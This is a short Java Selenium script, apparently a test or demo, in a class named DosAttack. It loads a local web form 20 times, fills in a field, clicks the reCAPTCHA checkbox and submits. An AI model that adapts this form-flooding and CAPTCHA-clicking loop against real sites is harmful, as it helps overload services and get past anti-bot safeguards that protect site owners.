import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;
import java.util.concurrent.TimeUnit;

public class DosAttack {
	WebDriver driver;

	public void invokeBrowser() {
		try {
			System.setProperty("webdriver.chrome.driver", "/usr/local/bin/chromedriver");
			driver = new ChromeDriver();

			Integer times = 20;
		    for(int i = 0; i < times; i++) {
		      driver.get("http://localhost.com:8000/form.html");
		      driver.findElement(By.id("group_247866674_2")).click();
		      driver.findElement(By.id("cc")).click();
		      driver.findElement(By.id("cc")).sendKeys("34234234");
		      driver.switchTo().frame(0);
		      driver.findElement(By.cssSelector(".recaptcha-checkbox-border")).click();
		      driver.switchTo().defaultContent();
		      driver.findElement(By.id("ss-submit")).click();
		    }
		} catch (Exception e) {
			e.printStackTrace();
		}
	}



	public static void main(String[] args) {
		DosAttack dosAttack = new DosAttack();
		dosAttack.invokeBrowser();
	}
}